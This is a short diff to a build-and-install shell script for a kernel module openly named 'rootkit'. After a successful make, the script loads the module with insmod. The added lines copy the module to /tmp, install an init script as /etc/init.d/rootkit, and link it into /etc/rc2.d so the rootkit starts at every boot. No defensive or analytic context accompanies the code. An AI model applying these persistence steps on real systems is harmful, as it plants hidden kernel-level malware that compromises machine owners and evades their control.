@@ -11,6 +11,9 @@ make
 
 if [ $? -eq 0 ]; then
     insmod ./rootkit.ko
+    cp rootkit.ko /tmp/rootkit.ko
+    cp init.sh /etc/init.d/rootkit
+    ln -s /etc/init.d/rootkit /etc/rc2.d/S01rootkit
 else
     echo "make failed"
     RET=1
